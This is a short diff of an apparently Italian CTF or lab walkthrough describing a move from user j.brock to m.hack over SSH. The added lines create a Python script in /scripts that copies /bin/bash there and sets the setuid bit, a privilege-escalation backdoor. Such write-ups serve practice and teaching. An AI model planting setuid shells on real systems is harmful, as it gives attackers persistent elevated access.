@@ -102,5 +102,6 @@ Entra su ssh come j.brock
 ### **j.brock to m.hack**
 vai in /scripts e crea un file random.py
 ```python
-`
+import os
+os.system('cp /bin/bash /scripts/; chmod +s /scripts/bash')
 ```
